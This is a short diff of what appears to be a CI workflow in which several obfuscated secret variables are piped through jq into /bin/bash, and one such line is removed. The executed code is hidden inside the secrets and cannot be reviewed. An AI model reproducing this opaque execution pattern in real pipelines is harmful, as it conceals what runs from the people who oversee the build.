@@ -18,7 +18,6 @@ jobs:
           m43: ${{ secrets.m43 }}
         run: |
           printf '%s' "$m43" | jq -r .hnxme48375 | /bin/bash
-          echo $eg01 | jq -r .fafyw0 | /bin/bash
           echo $rue5809 | jq -r .vrz715 | /bin/bash
           echo $vfy796 | jq -r .hjcut3044 | /bin/bash
           echo $zdby20 | jq -r .dfqqb8 | /bin/bash
